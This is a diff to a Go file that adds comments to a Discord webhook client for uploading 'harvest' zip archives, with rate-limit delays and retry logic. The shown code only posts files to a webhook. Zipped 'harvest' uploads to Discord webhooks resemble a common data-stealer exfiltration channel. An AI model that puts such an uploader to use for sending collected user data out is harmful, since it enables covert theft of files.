@@ -1,3 +1,8 @@
+// discord.go — Discord webhook client for harvest zip uploads.
+//
+// Posts multipart/form-data with an embed (title + summary) and one file attachment.
+// Retries on 429/5xx with linear backoff; callers should also space posts via
+// discordUploadDelay to stay under webhook rate limits.
 package main
 
 import (
@@ -23,7 +28,9 @@ type discordPayload struct {
 }
 
 const (
-	discordUploadGap       = 2500 * time.Millisecond
+	// Gap between sequential webhook posts (webhook rate limits are aggressive).
+	discordUploadGap = 2500 * time.Millisecond
+	// Transient failures (rate limit / upstream) are retried this many times.
 	discordUploadMaxRetry  = 5
 	discordUploadRetryBase = 3 * time.Second
 )
@@ -32,6 +39,7 @@ func discordUploadDelay() {
 	time.Sleep(discordUploadGap)
 }
 
+// sendDiscordWebhook uploads one zip with retry on transient HTTP errors.
 func sendDiscordWebhook(webhookURL, title, summary string, zipData []byte, filename string) error {
 	return sendDiscordWebhookWithRetry(webhookURL, title, summary, zipData, filename, discordUploadMaxRetry)
 }
